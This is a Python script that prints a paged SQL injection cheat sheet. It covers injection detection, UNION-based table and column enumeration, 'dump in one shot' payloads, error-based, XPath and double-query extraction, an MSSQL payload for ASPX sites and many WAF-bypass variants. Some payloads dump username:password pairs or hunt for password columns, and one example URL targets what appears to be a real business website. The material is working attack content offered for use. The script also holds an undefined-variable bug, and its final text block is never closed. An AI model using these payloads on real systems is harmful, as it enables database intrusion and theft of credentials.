#!/usr/bin/python3
# Console colors
bg ='' # '\033[44m'  # gray
W = bg+'\033[0m'  # white (normal)
R = bg+'\033[31m'  # red
G = bg+'\033[32m'  # green
O = bg+'\033[33m'  # orange
B = bg+'\033[34m'  # blue
P = bg+'\033[35m'  # purple
C = bg+'\033[36m'  # cyan
GR = bg+'\033[37m'  # gray

try:
    import os,time,sys
    from datetime import datetime
    now = datetime.now()   


 
except ImportError as e:
    print(R+'[!] Module %s not found install it ... '%str(e).split()[-4])
    exit()


clear = lambda: os.system('clear')
note=O+"""
-|----------------------------------------------------------------------------|-
 |: Using Apostrophe [']
 |: Using Quotation mark [?]
 |: Using English Alphabet [A]
 |: Using Single Quote / Quotation mark / English Alphabet {['],[?],[A]}
 |: add Point before the variable number and add Apostrophe after it [.x']
 |: add Point before and after variable number at the same time  [.x.]
 |: Add the Apostrophe before the variable number  [']
 |: Delete the variable number and add the Apostrophe only [']
 |: Delete the variable number and add a slash  [/]
 |: Using Logical expressions  [and 1=1]
-|----------------------------------------------------------------------------|-
1- Single Quote ↳ '
2- Double Quote ↳ "
3- Letter ↳ a
4- Adding Letter To Single Quote ↳ 'a Or To Double Quote ↳ "a
5- Adding Dot . Befor The Variable And Then Adding Single Quote After ↳ ID=.10'
6- Adding Dot . Befor The Variable And After The Variable IN The Same Time ↳ ID=.10.
7- Adding Single Quote Befor Variable Number ↳ ID='10
8- Delete The Variable Number And Just Adding Single Quote ↳ ID='
9- Delete The Variable And Add Just Slash Condition ↳ =\
10- Use ‫‪Logical‬‬ ‫‪Operator‬‬ ↳ And 1=1 , And 1=2
"""

clear()
print(note)


input("[Pres Enter]")
clear()

check_version=O+"""
----------------------------------------------------------------------------
 AND MID(VERSION(),1,1) = '3';
 AND MID(VERSION(),1,1) = '4';
 AND MID(VERSION(),1,1) = '5';
----------------------------------------------------------------------------
 and substring(version(),1,1)=3
 and substring(version(),1,1)=4
 and substring(version(),1,1)=5
----------------------------------------------------------------------------
 and substring(version(),1,1)=8
 and substring(version(),1,1)=9
 and substring(version(),1,1)=10
----------------------------------------------------------------------------
 and substring(Version(),1,1)like(3)
 and substring(Version(),1,1)like(4)
 and substring(Version(),1,1)like(5)
 and substring(Version(),1,1)not in(4,3)
 and substring(Version(),1,1)in(4,3)
----------------------------------------------------------------------------
"""
print(check_version)


note2=O+"""
cat=.1 and 1=1 -- -
----------------------------------------------------------------------------
cat=.2 order by 10 -- -
----------------------------------------------------------------------------
cat= 3-.1GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 asc
----------------------------------------------------------------------------
cat=.4 union select version(),2-- -
----------------------------------------------------------------------------
cat=.5 union select table_name          froM+InfORmaTion_scHema.tAblES -- -
----------------------------------------------------------------------------
cat=.6 union select table_name          froM+InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
----------------------------------------------------------------------------
cat=.7 union select group_concat(table_name)         froM+InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
----------------------------------------------------------------------------
http://www.waraxe.us/sql-char-encoder.html
----------------------------------------------------------------------------
cat=.8 union select group_concat(column_name)   +froM+InfORmaTion_scHema.cOlumnS WheRe+tAblE_naMe=0x6d656d626572 -- -
----------------------------------------------------------------------------
cat=.9 union select group_concat(username,0x3a,password)    from member -- -
----------------------------------------------------------------------------
show staff in source 
-------------------------------------------------------------------------
concat(0x223e3c62723e,version(),0x3c696d67207372633d22)

"""



clear()
print(note2)


input("[Pres Enter]")
clear()


level1=G+"""

order by 100 -- -
----------------------------------------------------------------------------
union select 1,2,3,4,5,6,7,8,9,10,version() -- -
----------------------------------------------------------------------------
union select 1,2,table_name, froM InfORmaTion_scHema.tAblES  -- -
----------------------------------------------------------------------------
union select table_name froM InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
----------------------------------------------------------------------------
union select group_concat(table_name) froM InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
----------------------------------------------------------------------------
#http://www.waraxe.us/sql-char-encoder.html
----------------------------------------------------------------------------
union select group_concat(column_name) froM InfORmaTion_scHema.cOlumnS WheRe tAblE_naMe=0x6c6f63616c5f61726561 -- -
----------------------------------------------------------------------------
union select group_concat(column,0x3a,column) from YOUR TABLE NAME  -- - 
----------------------------------------------------------------------------



"""


clear()
print(level1)

input("[Pres Enter]")
clear()



remod=""" 

php?id=.1'  and .0UnIOn-- -%0ASeLeCt 1,2,3-- -
----------------------------------------------------------------------------
php?id=5 and .0UnIOn-- -%0ASeLeCt 1,2,3,4,5,6 -- -
 ----------------------------------------------------------------------------
php?id=25' and .0UnIOn-- -%0ASeLeCt 1,2,3,4,5,6 -- -
----------------------------------------------------------------------------
php?id=7 and .0UnIOn-- -%0ASeLeCt 1,2,3,4-- -
----------------------------------------------------------------------------
php?id=7 div .0UnIOn-- -%0ASeLeCt 1,2,3,4-- -
----------------------------------------------------------------------------
AnD point(29,9) /*!50000UnIoN*/ /*!50000SeLeCt*/
----------------------------------------------------------------------------
' And .0union/**/distinct+select
----------------------------------------------------------------------------
' And/**/.0union/*%26*/distinctROW+select
----------------------------------------------------------------------------
%75%6e%69%6f%6e--%20-%0%73%65%6c%65%63%74
 
union sele%63t
 
%75nion %73elect

and 0 /*!50000Union*/ /*!00000Select*/ 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16`

cat=5||!{f`id`}union-- a%0Aselect 1,2 -- -

"""

clear()
print(remod)

input("[Pres Enter]")
clear()









level2=W+"""
----------------------------------------------------------------------------
DIOS START #start normal
--------------------------------------------------------------------------------------------------------------------------
(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c62723e,table_schema,0x2e,table_name,0x3a,column_name))))x)
--------------------------------------------------------------------------------------------------------------------------
#__TA__ #__C1__#__C2__
----------------------------------
(select(@) from (select (@:=0x00),(select (@) from (__TA__) where (@) in (@:=concat(@,0x0a,__C1__,0x3a,__C2__))))a)
--------------------------------------------------------------------------------------------------------------------------
=======================================================================================================================================================================
concat/***/(0x223e3c2f7461626c653e3c2f6469763e3c2f613e3c666f6e7420636f6c6f723d677265656e3e3c62723e3c62723e3c62723e,0x3c666f6e7420666163653d63616d62726961207374796c653d726567756c61722073697a653d3320636f6c6f723d7265643e7e7e7e7e7e3a3a3a3a3a496e6a656374656420627920426c61436b20526f7365205b4748545d3a3a3a3a3a7e7e7e7e7e3c62723e3c666f6e7420636f6c6f723d626c75653e2056657273696f6e203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,version(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e204461746162617365203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,database(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e2055736572203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,user(),0x3c62723e3c666f6e7420636f6c6f723d7265643e205461626c657320203c2f666f6e743e203a3a3a3a3a3a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e436f6c756d6e733c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e,@:=0,%28Select+count(*)from%28information_Schema.columns)where(table_schema=database())and@:=concat/**/
(@,0x3c6c693e,0x3c666f6e7420636f6c6f723d7265643e,table_name,0x3c2f666f6e743e203a3a3a3a3a3a3a3a3a3a3a2020203c666f6e7420636f6c6f723d677265656e3e,column_name,0x3c2f666f6e743e)),@,0x3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e)
=======================================================================================================================================================================

union select group_concat(column,0x3a,column) from YOUR TABLE NAME  -- - 

---------------------------------------------------------------------------------------------------------------------------------------

"""


clear()
print(level2)

input("[Pres Enter]")


level2a=W+"""--------------------------------------------------------------------------------------------------------------------------
# direct DIOS2 #start normal get all data 
--------------------------------------------------------------------------------------------------------------------------
Concat(0x2e2e4e616d65203a3a3a3a3a3a3a3a3a3a2050697368696361745f496e6a6563746f72,0x3c62723e,0x2e2e56657273696f6e203a3a3a3a3a3a3a20,@@`version`,0x3c62723e,0x2e2e55736572203a3a3a3a3a3a3a3a3a3a20,current_user(),0x3c62723e,0x2e2e4461746162617365203a3a3a3a3a3a20,database(),0x3c62723e,0x2e2e404064617461646972203a3a3a3a3a20,@@datadir,0x3c62723e,0x2e2e53796d6c696e6b203a3a3a3a3a3a3a20,@@HAVE_SYMLINK,0x3c62723e,0x2e2e486f7374204e616d65203a3a3a3a3a20,@@HOSTNAME,0x3c62723e,0x2e2e46696c652053797374656d203a3a3a20,@@CHARACTER_SET_FILESYSTEM ,0x3c62723e,0x2e2e426974732044657461696c73203a3a20,@@VERSION_COMPILE_MACHINE,0x3c62723e,0x2e2e546d70446972203a3a3a3a3a3a3a3a20,@@tmpdir,0x3c62723e,0x2e2e506f7274203a3a3a3a3a3a3a3a3a3a20,@@port,0x3c62723e,0x3c62723e,0x2e2e44696f73203a3a20,0x3c62723e,0x3c62723e,(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_schema,0x203a3a20,table_name,0x203a3a20,column_name,0x3c62723e))))a))
--------------------------------------------------------------------------------------------------------------------------
#__TA__ ~~ __C1__~~ __C2__
----------------------------------
(select(@) from (select (@:=0x00),(select (@) from (table) where (@) in (@:=concat(@,0x0a,column1,0x3a,column2))))a)
--------------------------------------------------------------------------------------------------------------------------
# direct DIOS3 #start normal get all data 
--------------------------------------------------------------------------------------------------------------------------
/*!00000concat*/(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a65637465642062792041686d656420456c204d656c656779203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d70696e6b2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select (@x) /*!00000from*/ (select (@x:=0x00),(select (0) /*!00000from*/ (information_schema/**/.columns)where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))
--------------------------------------------------------------------------------------------------------------------------
"""



clear()
print(level2a)

input("[Pres Enter]")
clear()


level2b="""
--------------------------------------------------------------------------------------------------------------------------
# direct DIOS4 #start normal get all data 
--------------------------------------------------------------------------------------------------------------------------
/*!00000concat*/(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a65637465642062792041686d656420456c204d656c656779203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d70696e6b2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select(@x)/*!00000from*/(select(@x:=0x00),(select(0)/*!00000from*/(information_schema/**/.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))
--------------------------------------------------------------------------------------------------------------------------
# direct DIOS5 #start normal get all data 
--------------------------------------
concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x3c62723e,0x7e7e696e6a65637420627920426c61436b526f73654748547e7e3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e64617461626173653d3d3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e,database(),0x3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e76657273696f6e3d3d3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e,version(),0x3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e757365723d3d3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e,user(),0x3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e506f72743d3d3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e,@@port,0x3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4f533d3d3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e,@@version_compile_os,0x3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e424954532044455441494c533d3c2f666f6e743e,0x3c666f6e7420636f6c6f723d626c75653e,@@version_compile_machine,0x3c666f6e7420636f6c6f723d677265656e3e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e46494c452053595354454d3d3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e,@@CHARACTER_SET_FILESYSTEM,0x3c2f666f6e743e,0x3c62723e,0x3c62723e,0x686f73746e616d653d3d,@@hostname,0x3c62723e,0x53797374656d2075756964206b65793d3d,UUID(),0x3c62723e,0x73796d6c696e6b3d3d,@@GLOBAL.have_symlink,0x3c62723e,0x53534c3d3d,@@GLOBAL.have_ssl,0x3c62723e,0x426173656469726563746f72793d3d,@@basedir)"""

clear()
print(level2b)

input("[Pres Enter]")
clear()



level2c="""

--------------------------------------------------------------------------------------------------------------------------
# direct DIOS5 #start normal get all data 
--------------------------------------------------------------------------------------------------------------------------

(sElect(@x)from(Select(@x:=0x00),(sElect(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c62723e,table_schema,0x3a,table_name,0x3a,column_name))))x)

--------------------------------------------------------------------------------------------------------------------------
(sElect(@x)from(Select(@x:=0x00), (@running_number:=0),(sElect(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c62723e,(@running_number:=@running_number%2b1),0x2e20,table_schema,0x3a,table_name,0x3a,column_name))))x)

--------------------------------------------------------------------------------------------------------------------------

https://www.validcreditcardnumber.com/
--------------------------------------------------------------------------------------------------------------------------"""


clear()
print(level2c)

input("[Pres Enter]")
clear()




level2d="""
--------------------------------------------------------------------------------------------------------------------------
Pass Detection # CASE statement
--------------------------------------------------------------------------------------------------------------------------
(select  (@x) from (select (@x:=0x00),(select (0) from  (information_schema.tables) where (0x00) in  (@x:=concat(@x,0x3c62723e,@tbl:=table_name,(Select CASE WHEN ( (select  count(*) from information_schema.columns where table_name=@tbl and  column_name like 0x257061737325)>0) THEN  0x3c666f6e7420636f6c6f723d677265656e3e3c623e202a2a2a2070617373202a2a2a203c2f623e3c666f6e7420636f6c6f723d626c75653e else 0x00 END)))))x) 
--------------------------------------------------------------------------------------------------------------------------
IF() function
-------------------------------------------------------------------------------------------------------------------------- 
(select  (@x) from (select (@x:=0x00),(select (0) from  (information_schema.tables) where (0x00) in  (@x:=concat(@x,0x3c62723e,@tbl:=table_name,(Select IF(( select count(*)  from information_schema.columns where table_name=@tbl and column_name  like 0x257061737325 >0),  0x3c666f6e7420636f6c6f723d677265656e3e3c623e202a2a2a2070617373202a2a2a203c2f623e3c666f6e7420636f6c6f723d626c75653e, 0x00))))))x)
--------------------------------------------------------------------------------------------------------------------------"""


clear()
print(level2d)

input("[Pres Enter]")
clear()





error_based="""
input("[Pres Enter]")
--------------------------------------------------------------------------------------------------------------------------
                                                error_based
--------------------------------------------------------------------------------------------------------------------------
: Version :
 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1-- -
 --------------------------------------------------------------------------------------------------------------------------
: Tables 
~~ __limit xxx,1__~~ 
----------------------------------
 or 1 group by concat_ws(0x7e,(select table_name from information_schema.tables ​where table_schema=database() limit 0,1),floor(rand(0)*2)) having min(0) or 1-- -
 --------------------------------------------------------------------------------------------------------------------------
: Columns 
-------------------
~~ __T.Hex__~~
----------------------------------
 or 1 group by concat_ws(0x7e,(select column_name from information_schema.column​s where table_name=__T.Hex__ limit 0,1),floor(rand(0)*2)) having min(0) or 1-- -
 --------------------------------------------------------------------------------------------------------------------------
: Getting Data From The Columns
 --------------------------------------------------------------------------------------------------------------------------
 #__TA__ ~~ __C1__~~ __C2__
----------------------------------
 or 1 group by concat_ws(0x7e,(select concat(__C1__,0x7e,__C2__) from __TA__ limit 0,1),floor(rand(0)*2)) having min(0) or 1-- -
--------------------------------------------------------------------------------------------------------------------------

"""


clear()
print(error_based)
input("[Pres Enter]")

clear()
xpath_Injection="""
input("[Pres Enter]")
--------------------------------------------------------------------------------------------------------------------------
                                                xpath Injection
--------------------------------------------------------------------------------------------------------------------------
: version 
 
 and extractvalue(rand(),concat(0x7e,version()))-- - 
 --------------------------------------------------------------------------------------------------------------------------
: Tables :
~~ __limit 0,1__~~
----------------------------------
 and extractvalue(rand(),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- -
 --------------------------------------------------------------------------------------------------------------------------
: column :
-------------------
~~ __T.Hex__~~
---------------------------------- 
and extractvalue(rand(),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- -
 
 and extractvalue(rand(),concat(0x7e,(select column_name from information_schema.columns where table_name=__T.Hex__ limit 0,1)))-- - 
 --------------------------------------------------------------------------------------------------------------------------

: Data :
--------------------------------------------------------------------------------------------------------------------------
  #__TA__ ~~ __C1__~~ __C2__
----------------------------------

 and extractvalue(rand(),concat(0x7e,(select concat( __C1__,0x7e,__C2__) from __TA__ limit 0,1)))-- -
--------------------------------------------------------------------------------------------------------------------------
* note remove any buk code  T&#8203;ABLENAME 
--------------------------------------------------------------------------------------------------------------------------

 """





clear()
print(xpath_Injection)
input("[Pres Enter]")

clear()


xpath_UpdateXML="""
--------------------------------------------------------------------------------------------------------------------------
                                               xpath UpdateXML
--------------------------------------------------------------------------------------------------------------------------
#version
and updatexml(0x7e,concat(0x7e,(version())),0)--
and updatexml(1,/*!%0aconcat*/(0x7e,(/*!%0aSelEcT*/ version()),0x7e),1)
--------------------------------------------------------------------------------------------------------------------------
 
: Getting The Tables (UpdateXML)
--------------------------------------------------------------------------------------------------------------------------
 ~~ __limit 0,1__~~
----------------------------------
 and updatexml(0x7e,concat(0x7e,((select concat(table_name) from information_sch​ema.tables where table_schema=database() limit 0,1))),0)--
 -------------------------------------------------------------------------------------------------------------------------- 
:  Getting Columns (UpdateXML)
--------------------------------------------------------------------------------------------------------------------------
~~ __T.Hex__~~
 ----------------------------------
 and updatexml(0x7e,concat(0x7e,((select concat(column_name) from information_sc​hema.columns where table_name=~~ __T.Hex__~~ limit 0,1))),0)--
 --------------------------------------------------------------------------------------------------------------------------
:  Getting Data (UpdateXML)
 --------------------------------------------------------------------------------------------------------------------------
   #__TA__ ~~ __C1__~~ __C2__
----------------------------------

 and updatexml(0x7e,concat(0x7e,((select concat(__C1__,0x7e​,__C2__) from __TA__ limit 0,1))),0)--
 --------------------------------------------------------------------------------------------------------------------------
"""


clear()
print(xpath_UpdateXML)
input("[Pres Enter]")

clear()



DOUBLE_Query_Injection="""
--------------------------------------------------------------------------------------------------------------------------
                                                DOUBLE Query Injection's
--------------------------------------------------------------------------------------------------------------------------
: version
 
 and(select 1 from(select count(*),concat((select (select concat(version())) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
 --------------------------------------------------------------------------------------------------------------------------
: Getting The DataBase  
 
 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
 -------------------------------------------------------------------------------------------------------------------------- 
: Getting The Tables
--------------------------------------------------------------------------------------------------------------------------   
  ~~ __DB.Hex__~~
----------------------------------
 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,concat(table_name),0x27,0x7e) from information_schema.tables where table_schema=__DB.Hex__limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
 --------------------------------------------------------------------------------------------------------------------------
: Getting The Columns  
--------------------------------------------------------------------------------------------------------------------------
 ~~ __DB.Hex__~~ || ~~__TA__ ~~
---------------------------------- 
 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(column_name as char),0x27,0x7e) FROM information_schema.columns Where table_schema=__DB.Hex__ AND table_name=__TA__ LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
 --------------------------------------------------------------------------------------------------------------------------
: Dump Data   
--------------------------------------------------------------------------------------------------------------------------
 ~~ __DB__~~ || ~~__TA__ ~~  ~~ __C1__~~ __C2__
----------------------------------
and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(__TA__.__C1__ as char),0x27,0x7e,cast(__TA__.__C2__ as char)) FROM `__DB__`.__TA__ LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1

"""



clear()
print(DOUBLE_Query_Injection)
input("[Pres Enter]")

clear()


ASPX_Site="""
--------------------------------------------------------------------------------------------------------------------------
							Begin Declare The DIOS For ASPX Site
--------------------------------------------------------------------------------------------------------------------------
The DIOS Table
 --------------------------------------------------------------------------------------------------------------------------
;begin declare @x varchar(8000),@y int,@z varchar(50),@a varchar(100) declare @myTbl table (name varchar(8000) not null)SET @y=1 SET @x='injected by Me :: '+@@version+ CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+'Database : '+db_name()+ CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl)select @a=@a + column_name+' : 'from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x +CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+'Table: '+@z+ CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+'Columns : '+@a+ CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)SET @y = @y+1 end select @x as output into BlackRose END--
--------------------------------------------------------------------------------------------------------------------------
 -------------------------------------------------------------------------------------------------------------------------
OutPut Data
----------------------------------->
 and 1=convert(int,(select top 1 output from BlackRose))--
--------------------------------------------------------------------------------------------------------------------------

 select output  from BlackRose
--------------------------------------------------------------------------------------------------------------------------
 """



clear()
print(ASPX_Site)
input("[Pres Enter]")


#---------------------------------------------------------------
#part 3 waf
#---------------------------------------------------------------


Not_Acceptable_Forbidden="""
--------------------------------------------------------------------------------------------------------------------------
//Not Acceptable // Forbidden
--------------------------------------------------------------------------------------------------------------------------


/*!50000Union*/  SeLEct


Union /*!50000SeLEct*/

/*!50000UnIoN*/ /*!50000SeLeCt*/

/*!50000 */   
/*!40000 */
/*!30000 */

/*!12345 */
/*!41320 */
/*!32302 */

union distinct select
union distinctROW select
--------------------------------------------------------------------------------------------------------------------------
"""


clear()
print(Not_Acceptable_Forbidden)
input("[Pres Enter]")





alpha=""" 
--------------------------------------------------------------------------------------------------------------------------
The used SELECT statements have a different number of columns
--------------------------------------------------------------------------------------------------------------------------
this mean you can not use (union select )
--------------------------------------------------------------------------------------------------------------------------

+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1--
--------------------------------------------------------------------------------------------------------------------------

or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1--

--------------
{ cll } mean windows system
"""



clear()
print(alpha)
input("[Pres Enter]")


WAF="""
--------------------------------------------------------------------------------------------------------------------------
WAF Bypassing By Using False Statement 
--------------------------------------------------------------------------------------------------------------------------

&id=polygon(10) union/**/DistinctRow select 1,2-- -
&id=polygon(point(53,12)) union/**/DistinctRow select 1,2-- -
&id=polygon@' union/**/DistinctRow select 1,2-- -
&id=@10 union/**/DistinctRow select 1,2-- -
&id=@@new union/**/DistinctRow select 1,2-- -
&id=@-.@union/**/DistinctRow select 1,2-- -
&id=10 %26%26 NULL union/**/DistinctRow select 1,2-- -
&id=@ Or 1<0 union/**/DistinctRow select 1,2-- -
&id=@<0union/**/DistinctRow select 1,2-- -
&id=10 And point(53,12) union/**/DistinctRow select 1,2-- -
&id=10 And RADIANS(point(53,12)) union/**/DistinctRow select 1,2-- -
&id=10 And Polygon(Point(53,12)) union/**/DistinctRow select 1,2-- -
&id=10 And Multipolygon(Point(53,12)) union/**/DistinctRow select 1,2-- -
&id=10 And Linestring(Point(53,12)) union/**/DistinctRow select 1,2-- -
&id=10 And Multilinestring(Point(53,12)) union/**/DistinctRow select 1,2-- -
&id=10 And Geometrycollection(Point(53,12)) union/**/DistinctRow select 1,2-- -
&id=10 And MOD(29,9) union/**/DistinctRow select 1,2-- -
&id=10 And MOD(234, 10) union/**/DistinctRow select 1,2-- -
&id=10 %26%26 MOD(29,9) union/**/DistinctRow select 1,2-- -
&id={f -@} union/**/DistinctRow select 1,2-- -
&id=10 IS NOT NULL=0 union/**/DistinctRow select 1,2-- -
&id=10 And NAME_CONST(version(),0) union/**/DistinctRow select 1,2-- -
&id=10 NOT LIKE 1 union/**/DistinctRow select 1,2-- -
&id=10 IS NULL union/**/DistinctRow select 1,2-- -
&id=10 IS FALSE union/**/DistinctRow select 1,2-- -
&id=10 And 253 % 1 union/**/DistinctRow select 1,2-- -
&id=10 And 253 %25 union/**/DistinctRow select 1,2-- -
&id=10 || FALSE union/**/DistinctRow select 1,2-- -
--------------------------------------------------------------------------------------------------------------------------
%26%26 SIGN(-0) union/**/DistinctRow select 1,2-- -
%26%26 FLOOR(-0.0) union/**/DistinctRow select 1,2-- -
%26%26 CEILING(-0.23) union/**/DistinctRow select 1,2-- -
%26%26 ROUND(-0.23) union/**/DistinctRow select 1,2-- -
%26%26 EXP(-800) union/**/DistinctRow select 1,2-- -
%26%26 LOG(-1) union/**/DistinctRow select 1,2-- -
%26%26 LOG10(-100) union/**/DistinctRow select 1,2-- -
%26%26 POW(0,-2) union/**/DistinctRow select 1,2-- -
%26%26 SQRT(0) union/**/DistinctRow select 1,2-- -
%26%26 ACOS(1.0001) union/**/DistinctRow select 1,2-- -
%26%26 ASIN(0.2) union/**/DistinctRow select 1,2-- -
%26%26 ATAN(-1,2) union/**/DistinctRow select 1,2-- -
%26%26 COT(0) union/**/DistinctRow select 1,2-- -
%26%26 RAND(0) union/**/DistinctRow select 1,2-- -
%26%26 LEAST(2,0) union/**/DistinctRow select 1,2-- -
%26%26 GREATEST(0,0) union/**/DistinctRow select 1,2-- -
%26%26 RADIANS(0) union/**/DistinctRow select 1,2-- -
%26%26 TRUNCATE(0.999,0) union/**/DistinctRow select 1,2-- -
%26%26 TRUNCATE(0.0*100,0) union/**/DistinctRow select 1,2-- -
And POWER(0,1) union/**/DistinctRow select 1,2-- -
And POW(0,1) union/**/DistinctRow select 1,2-- -

-------------
Example
-------------
https://pizzacrust.com.pk/deals.php?id=polygon@" order by 100 asc-- -
"""





clear()
print(waf)
input("[Pres Enter]")



bravo="""
*************************************************************
illegal mix of collations
**************************************
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
convert(value using xxxx)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
--------------------------------------------------------------------------------------------
convert(group_concat(table_name) using ascii)


--------------------------------------------------------------------------------------------
unhex(hex(value))

--------------------------------------------------------------------------------------------
cast(value as char)
--------------------------------------------------------------------------------------------
uncompress(compress(version()))
--------------------------------------------------------------------------------------------
cast(value as char)
--------------------------------------------------------------------------------------------
aes_decrypt(aes_encrypt(value,1),1)
--------------------------------------------------------------------------------------------
binary(value)
======================================================================================================
